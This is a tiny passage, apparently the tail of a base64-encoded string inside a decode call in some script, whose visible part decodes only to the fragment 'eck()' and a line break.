ZWNrKCkNCg=='))
